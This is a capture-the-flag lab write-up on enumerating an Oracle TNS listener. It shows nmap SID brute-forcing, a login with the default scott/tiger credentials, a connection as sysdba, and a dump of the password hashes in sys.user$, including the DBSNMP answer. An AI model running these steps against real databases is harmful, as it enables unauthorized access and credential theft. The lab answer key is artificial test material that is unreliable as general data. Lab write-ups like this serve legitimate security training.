# &#x1F6A9; Oracle TNS Footprinting <br>
<mark>hook it up with a &#x2B50; if this helps!</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>
<br>
Target IP:10.129.14.222

---
### TTP Question 1:
Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

	$ sudo nmap -p 1521 -sV --open 10.129.14.222
	
		Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-25 18:47 CDT
		Nmap scan report for 10.129.14.222
		Host is up (0.0089s latency).
		
		PORT     STATE SERVICE    VERSION
		1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Initial scan of 1521 found the listener up.

	$ sudo nmap -p 1521 -sV --open --script=oracle-sid-brute 10.129.14.222 
		
		Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-25 18:49 CDT
		Nmap scan report for 10.129.14.222
		Host is up (0.0087s latency).
		
		PORT     STATE SERVICE    VERSION
		1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
		| oracle-sid-brute: 
		|_  XE

welp, found 'XE' sid.

I installed sqlplus. updated /.bashrc with the new path.


	$ sqlplus scott/tiger@10.129.14.222/XE
	
		SQL*Plus: Release 21.0.0.0.0 - Production on Mon Aug 25 19:12:22 2025
		Version 21.4.0.0.0
		
		Copyright (c) 1982, 2021, Oracle.  All rights reserved.
		
		ERROR:
		ORA-28002: the password will expire within 7 days
		
		
		
		Connected to:
		Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
		
		SQL>

So I ran query:

	SQL> select table_name from all_tables;
		
		TABLE_NAME
		------------------------------
		DUAL
		SYSTEM_PRIVILEGE_MAP
		TABLE_PRIVILEGE_MAP
		STMT_AUDIT_OPTION_MAP
		AUDIT_ACTIONS
		WRR$_REPLAY_CALL_FILTER
		HS_BULKLOAD_VIEW_OBJ
		HS$_PARALLEL_METADATA
		HS_PARTITION_COL_NAME
		HS_PARTITION_COL_TYPE
		HELP
		
		TABLE_NAME
		------------------------------
		DR$OBJECT_ATTRIBUTE
		DR$POLICY_TAB
		DR$THS
		DR$THS_PHRASE
		DR$NUMBER_SEQUENCE
		SRSNAMESPACE_TABLE
		OGIS_SPATIAL_REFERENCE_SYSTEMS
		OGIS_GEOMETRY_COLUMNS
		SDO_UNITS_OF_MEASURE
		SDO_PRIME_MERIDIANS
		SDO_ELLIPSOIDS
		
		TABLE_NAME
		------------------------------
		SDO_DATUMS
		SDO_COORD_SYS
		SDO_COORD_AXIS_NAMES
		SDO_COORD_AXES
		SDO_COORD_REF_SYS
		SDO_COORD_OP_METHODS
		SDO_COORD_OPS
		SDO_PREFERRED_OPS_SYSTEM
		SDO_PREFERRED_OPS_USER
		SDO_COORD_OP_PATHS
		SDO_COORD_OP_PARAMS
		
		TABLE_NAME
		------------------------------
		SDO_COORD_OP_PARAM_USE
		SDO_COORD_OP_PARAM_VALS
		SDO_CS_SRS
		NTV2_XML_DATA
		SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT
		SDO_PROJECTIONS_OLD_SNAPSHOT
		SDO_ELLIPSOIDS_OLD_SNAPSHOT
		SDO_DATUMS_OLD_SNAPSHOT
		SDO_XML_SCHEMAS
		WWV_FLOW_DUAL100
		DEPT
		
		TABLE_NAME
		------------------------------
		EMP
		BONUS
		SALGRADE
		WWV_FLOW_TEMP_TABLE
		WWV_FLOW_LOV_TEMP
		SDO_TOPO_DATA$
		SDO_TOPO_RELATION_DATA
		SDO_TOPO_TRANSACT_DATA
		SDO_CS_CONTEXT_INFORMATION
		SDO_TXN_IDX_EXP_UPD_RGN
		SDO_TXN_IDX_DELETES
		
		TABLE_NAME
		------------------------------
		SDO_TXN_IDX_INSERTS
		SDO_ST_TOLERANCE
		XDB$XIDX_IMP_T
		KU$_DATAPUMP_MASTER_10_1
		KU$_DATAPUMP_MASTER_11_1
		KU$_DATAPUMP_MASTER_11_1_0_7
		KU$_DATAPUMP_MASTER_11_2
		IMPDP_STATS
		ODCI_PMO_ROWIDS$
		ODCI_WARNINGS$
		ODCI_SECOBJ$
		
		TABLE_NAME
		------------------------------
		KU$_LIST_FILTER_TEMP_2
		KU$_LIST_FILTER_TEMP
		KU$NOEXP_TAB
		OL$NODES
		OL$HINTS
		OL$
		PLAN_TABLE$
		WRI$_ADV_ASA_RECO_DATA
		PSTUBTBL
		
		75 rows selected.

then check user privs:

	SQL> select * from user_role_privs;
	
		USERNAME		       GRANTED_ROLE		      ADM DEF OS_
		------------------------------ ------------------------------ --- --- ---
		SCOTT			       CONNECT			      NO  YES NO
		SCOTT			       RESOURCE 		      NO  YES NO


no admin bits set so i used his account to try to login as 'sysdba':

	$ sqlplus scott/tiger@10.129.14.222/XE as sysdba
	
		SQL*Plus: Release 21.0.0.0.0 - Production on Mon Aug 25 19:27:37 2025
		Version 21.4.0.0.0
		
		Copyright (c) 1982, 2021, Oracle.  All rights reserved.
		
		
		Connected to:
		Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

And then ran user priv check again:

	SQL> select * from user_role_privs;
	
		USERNAME		       GRANTED_ROLE		      ADM DEF OS_
		------------------------------ ------------------------------ --- --- ---
		SYS			       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
		SYS			       APEX_ADMINISTRATOR_ROLE	      YES YES NO
		SYS			       AQ_ADMINISTRATOR_ROLE	      YES YES NO
		SYS			       AQ_USER_ROLE		      YES YES NO
		SYS			       AUTHENTICATEDUSER	      YES YES NO
		SYS			       CONNECT			      YES YES NO
		SYS			       CTXAPP			      YES YES NO
		SYS			       DATAPUMP_EXP_FULL_DATABASE     YES YES NO
		SYS			       DATAPUMP_IMP_FULL_DATABASE     YES YES NO
		SYS			       DBA			      YES YES NO
		SYS			       DBFS_ROLE		      YES YES NO
		
		USERNAME		       GRANTED_ROLE		      ADM DEF OS_
		------------------------------ ------------------------------ --- --- ---
		SYS			       DELETE_CATALOG_ROLE	      YES YES NO
		SYS			       EXECUTE_CATALOG_ROLE	      YES YES NO
		SYS			       EXP_FULL_DATABASE	      YES YES NO
		SYS			       GATHER_SYSTEM_STATISTICS       YES YES NO
		SYS			       HS_ADMIN_EXECUTE_ROLE	      YES YES NO
		SYS			       HS_ADMIN_ROLE		      YES YES NO
		SYS			       HS_ADMIN_SELECT_ROLE	      YES YES NO
		SYS			       IMP_FULL_DATABASE	      YES YES NO
		SYS			       LOGSTDBY_ADMINISTRATOR	      YES YES NO
		SYS			       OEM_ADVISOR		      YES YES NO
		SYS			       OEM_MONITOR		      YES YES NO
		
		USERNAME		       GRANTED_ROLE		      ADM DEF OS_
		------------------------------ ------------------------------ --- --- ---
		SYS			       PLUSTRACE		      YES YES NO
		SYS			       RECOVERY_CATALOG_OWNER	      YES YES NO
		SYS			       RESOURCE 		      YES YES NO
		SYS			       SCHEDULER_ADMIN		      YES YES NO
		SYS			       SELECT_CATALOG_ROLE	      YES YES NO
		SYS			       XDBADMIN 		      YES YES NO
		SYS			       XDB_SET_INVOKER		      YES YES NO
		SYS			       XDB_WEBSERVICES		      YES YES NO
		SYS			       XDB_WEBSERVICES_OVER_HTTP      YES YES NO
		SYS			       XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO
		
		32 rows selected.

I could have poked around for the password list but just ran:

	SQL> select name, password from sys.user$;
		
		NAME			       PASSWORD
		------------------------------ ------------------------------
		SYS			       FBA343E7D6C8BC9D
		PUBLIC
		CONNECT
		RESOURCE
		DBA
		SYSTEM			       B5073FE1DE351687
		SELECT_CATALOG_ROLE
		EXECUTE_CATALOG_ROLE
		DELETE_CATALOG_ROLE
		OUTLN			       4A3BA55E08595C81
		EXP_FULL_DATABASE
		
		NAME			       PASSWORD
		------------------------------ ------------------------------
		IMP_FULL_DATABASE
		LOGSTDBY_ADMINISTRATOR
		DBFS_ROLE
		DIP			       CE4A36B8E06CA59C
		AQ_ADMINISTRATOR_ROLE
		AQ_USER_ROLE
		DATAPUMP_EXP_FULL_DATABASE
		DATAPUMP_IMP_FULL_DATABASE
		ADM_PARALLEL_EXECUTE_TASK
		GATHER_SYSTEM_STATISTICS
		XDB_WEBSERVICES_OVER_HTTP
		
		NAME			       PASSWORD
		------------------------------ ------------------------------
		ORACLE_OCM		       5A2E026A9157958C
		RECOVERY_CATALOG_OWNER
		SCHEDULER_ADMIN
		HS_ADMIN_SELECT_ROLE
		HS_ADMIN_EXECUTE_ROLE
		HS_ADMIN_ROLE
		OEM_ADVISOR
		OEM_MONITOR
		DBSNMP			       E066D214D5421CCC
		APPQOSSYS		       519D632B7EE7F63A
		PLUSTRACE
		
		NAME			       PASSWORD
		------------------------------ ------------------------------
		CTXSYS			       D1D21CA56994CAB6
		CTXAPP
		XDB			       E76A6BD999EF9FF1
		ANONYMOUS		       anonymous
		XDBADMIN
		XDB_SET_INVOKER
		AUTHENTICATEDUSER
		XDB_WEBSERVICES
		XDB_WEBSERVICES_WITH_PUBLIC
		XS$NULL 		       DC4FCC8CB69A6733
		_NEXT_USER
		
		NAME			       PASSWORD
		------------------------------ ------------------------------
		MDSYS			       72979A94BAD2AF80
		HR			       4C6D73C3E8B0F0DA
		FLOWS_FILES		       30128982EA6D4A3D
		APEX_PUBLIC_USER	       4432BA224E12410A
		APEX_ADMINISTRATOR_ROLE
		APEX_040000		       E7CE9863D7EEB0A4
		SCOTT			       F894844C34402B67
		
		51 rows selected.


&#x1F6A9; found **E066D214D5421CCC**
